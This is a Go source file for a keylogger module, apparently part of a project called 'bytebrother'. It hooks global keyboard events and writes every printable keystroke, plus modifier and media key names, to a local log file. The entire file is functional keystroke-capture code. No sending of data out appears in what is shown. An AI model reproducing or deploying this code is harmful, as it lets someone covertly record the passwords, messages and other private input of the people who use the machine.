package hook

import (
	"fmt"
	"os"

	fl "bytebrother/main/filer"
	hook "github.com/robotn/gohook"
)

func StartHook() {
	evChan := hook.Start()
	defer hook.End()

	for ev := range evChan {
		char := rune((uint16(ev.Keychar))) // Convert rune to uint16
		if char >= 32 && char <= 126 {     // Check if the character is printable
			switch ev.Kind {
			case hook.KeyDown:
				WriteKeyToFile(fmt.Sprintf("%c", char))
			case hook.KeyHold:
				WriteKeyToFile(fmt.Sprintf("%c", char))
			case hook.KeyUp:
				WriteKeyToFile(fmt.Sprintf("%c", char))
			}
		} else if ev.Keychar == 65535 { // Check if the key is a modifier key
			if ev.Keycode == 57 {
				continue
			}
			switch ev.Kind {
			// case hook.KeyDown:
			// 	WriteKeyToFile(fmt.Sprintf("[%s]", DetectModifierKey(ev.Keycode)))
			case hook.KeyHold:
				WriteKeyToFile(fmt.Sprintf("[%s]", DetectModifierKey(ev.Keycode)))
				// case hook.KeyUp:
				// 	WriteKeyToFile(fmt.Sprintf("[%s]", DetectModifierKey(ev.Keycode)))
			}
		}
	}
}

func WriteKeyToFile(string string) {
	if string == "[Unknown]" {
		return
	}

	file, err := os.OpenFile(fl.LogFolder+fl.KeyLogs, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening file: %v\n", err)
	}
	defer file.Close()

	_, err = file.WriteString(string)
	if err != nil {
		fmt.Printf("Error writing to file: %v\n", err)
	}
}

func DetectModifierKey(keycode uint16) string {
	switch keycode {
	case 1:
		return "Escape"
	case 29:
		return "Ctrl"
	case 8:
		return "Shift"
	case 56:
		return "Alt"
	case 42:
		return "LShift"
	case 54:
		return "RShift"
	case 58:
		return "CapsLock"
	case 3640:
		return "RAlt"
	case 28:
		return "Enter"
	case 14:
		return "Backspace"
	case 15:
		return "Tab"
	case 59:
		return "F1"
	case 60:
		return "F2"
	case 61:
		return "F3"
	case 62:
		return "F4"
	case 63:
		return "F5"
	case 64:
		return "F6"
	case 65:
		return "F7"
	case 66:
		return "F8"
	case 67:
		return "F9"
	case 68:
		return "F10"
	case 87:
		return "F11"
	case 88:
		return "F12"
	case 70:
		return "ScrollLock"
	case 61001:
		return "PageUp"
	case 61009:
		return "PageDown"
	case 61007:
		return "End"
	case 60999:
		return "Home"
	case 61010:
		return "Insert"
	case 61011:
		return "Delete"
	case 3613:
		return "RCtrl"
	case 3677:
		return "Mystery"
	case 3676:
		return "Lwin"
	case 3653:
		return "PauseBreak"
	case 3639:
		return "printScreen"
	case 57380:
		return "MediaStop"
	case 57360:
		return "MediaBackward"
	case 57378:
		return "MediaPlayPause"
	case 57369:
		return "MediaForward"
	case 57392:
		return "MediaUp"
	case 57390:
		return "MediaDown"
	case 57376:
		return "MediaMute"
	default:
		return "Unknown"
	}
}
